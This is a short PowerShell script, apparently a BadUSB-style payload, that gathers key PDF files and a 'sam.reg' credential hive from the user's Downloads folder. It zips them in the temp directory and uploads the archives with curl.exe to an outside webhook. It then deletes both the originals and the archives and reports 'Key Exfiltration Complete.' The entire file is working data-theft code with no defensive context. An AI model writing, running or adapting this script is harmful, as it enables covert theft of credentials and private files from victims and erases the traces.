$hookurl = "$dc"

Function Exfiltrate {

param ([string[]]$FileType,[string[]]$Path)
$maxZipFileSize = 25MB
$currentZipSize = 0
$index = 1
$zipFilePath ="$env:temp/keys$index.zip"

$filesToZip = @(
    "$env:USERPROFILE\Downloads\key_1.pdf",
    "$env:USERPROFILE\Downloads\key_2.pdf",
    "$env:USERPROFILE\Downloads\key_3.pdf",
    "$env:USERPROFILE\Downloads\key_4.pdf",
    "$env:USERPROFILE\Downloads\sam.reg"
)

Add-Type -AssemblyName System.IO.Compression.FileSystem
$zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')

foreach ($filePath in $filesToZip) {
    if (Test-Path -Path $filePath) {
        $file = Get-Item $filePath
        $fileSize = $file.Length


        if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
            $zipArchive.Dispose()
            $currentZipSize = 0
            curl.exe -F file1=@"$zipFilePath" $hookurl
            Remove-Item -Path $zipFilePath -Force
            Sleep 1
            $index++
            $zipFilePath ="$env:temp/keys$index.zip"
            $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
        }

        $entryName = [System.IO.Path]::GetFileName($filePath)
        [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $filePath, $entryName)
        $currentZipSize += $fileSize
        Remove-Item -Path $filePath -Force

    } else {
        Write-Output "File not found: $filePath"
    }
}

$zipArchive.Dispose()
curl.exe -F file1=@"$zipFilePath" $hookurl
Remove-Item -Path $zipFilePath -Force
Write-Output "$env:COMPUTERNAME : Key Exfiltration Complete."
}

Exfiltrate
